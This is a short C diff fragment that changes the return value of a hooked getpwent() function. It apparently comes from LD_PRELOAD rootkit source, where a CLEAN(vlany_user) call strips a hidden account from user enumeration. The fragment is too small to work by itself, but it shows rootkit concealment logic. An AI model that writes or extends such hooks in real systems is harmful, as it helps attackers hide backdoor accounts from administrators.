@@ -14,5 +14,5 @@ struct passwd *getpwent(void)
         CLEAN(vlany_user);
     }
 
-    return old_getpwent();
+    return tmp;
 }
